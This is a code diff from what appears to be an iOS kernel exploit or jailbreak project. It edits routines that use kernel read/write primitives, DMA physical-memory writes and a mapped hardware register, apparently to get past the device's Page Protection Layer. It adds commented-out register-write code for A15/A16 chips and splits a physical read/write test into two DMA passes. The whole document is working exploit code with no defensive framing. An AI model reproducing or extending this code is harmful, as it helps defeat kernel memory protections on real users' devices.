@@ -153,6 +153,18 @@ void gfx_power_init(void)
             }
         }
     }
+    /*
+    if(isa15a16) {
+        if(base6150020_back == 1) {
+            uint64_t base6150000 = (uint64_t)IOSurface_map(0x206150000, 0x100);
+            base6150020 = base6150000 + 0x20;
+            base6150020_back = 0;
+            }
+        printf("%llx\n", base6150020);
+        printf("%llx\n", base6150020_back);
+        kwrite64_kfd(base6150020, 1);
+    }
+     */
 }
 
 void dma_ctrl_1(void)
@@ -410,6 +422,11 @@ void dma_perform(void (^block)(void))
     block();
     
     ml_dbgwrap_unhalt_cpu();
+    /*
+    if(base6150020_back != 1){
+        *(uint64_t *)base6150020 = base6150020_back;
+    }
+     */
 }
 
 bool test_pplrw_phys(void)
@@ -425,12 +442,15 @@ bool test_pplrw_phys(void)
     __block bool work1 = false, work2 = false;
     dma_perform(^{
         dma_writephys64(table + 8, 0x4141414141414141);
-        dma_writephys64(table + 16, 0x4242424242424242);
         
         if (kread64_kfd(table_v + 8) == 0x4141414141414141) {
             dma_writephys64(table + 8, og1);
             work1 = true;
         }
+    });
+    
+    dma_perform(^{
+        dma_writephys64(table + 16, 0x4242424242424242);
         if (kread64_kfd(table_v + 16) == 0x4242424242424242) {
             dma_writephys64(table + 16, og2);
             work2 = true;
